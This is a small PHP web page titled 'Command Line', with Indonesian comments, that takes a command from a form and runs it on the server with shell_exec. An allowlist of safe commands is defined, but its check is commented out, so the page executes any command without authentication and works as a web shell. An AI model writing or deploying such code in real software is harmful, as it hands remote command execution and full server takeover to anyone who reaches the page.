<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Line</title>
</head>

<body>
    <form action="" method="post">
        <input type="text" name="command">
        <button type="submit" name="btnExec">Exec</button>
    </form>

    <pre>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Daftar perintah yang diizinkan
            $allowedCommands = ['ls', 'whoami', 'date']; // Tambahkan perintah lain yang diizinkan
        
            $command = escapeshellcmd($_POST['command']);

            // if (in_array($command, $allowedCommands)) {
            $exec = shell_exec($command);
            echo htmlspecialchars($exec);
            // } else {
            //     echo "Perintah tidak diizinkan!";
            // }
        }
        ?>
    </pre>
</body>

</html>